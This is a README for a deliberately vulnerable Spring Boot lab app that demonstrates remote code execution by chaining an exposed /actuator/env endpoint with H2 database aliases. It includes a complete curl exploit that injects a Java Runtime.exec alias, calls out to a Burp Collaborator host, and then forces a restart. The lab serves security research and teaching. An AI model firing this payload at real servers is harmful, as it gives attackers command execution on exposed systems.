# Spring Boot Actuator H2 RCE

## Introduction

Writeup: [Remote Code Execution in Three Acts: Chaining Exposed Actuators and H2 Database Aliases in Spring Boot 2](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

This is a sample app based off the default Spring Boot app in Spring's [documentation](https://spring.io/guides/gs/spring-boot-docker/) that demonstrates how an attacker can achieve RCE on an instance with an exposed `/actuator/env` endpoint and a H2 database.

## Usage

First, start the app. You can do this locally or with Docker.

### Local
If you run this locally, you need JDK 1.8 or later and Maven 3.2+.

`./mvnw package && java -jar target/gs-spring-boot-docker-0.1.0.jar`

### Docker

1. `sudo docker build -t spaceraccoon/spring-boot-rce-lab .`
2. `sudo docker run -p 8080:8080 -t spaceraccoon/spring-boot-rce-lab`

The app is now running on `localhost:8080`.

### Exploit

1. (Modify the curl request accordingly) `curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'curl  http://x.burpcollaborator.net\');\"}' 'http://localhost:8080/actuator/env'`
2. `curl -X 'POST' -H 'Content-Type: application/json' 'http://localhost:8080/actuator/restart'`

You will receive a pingback.
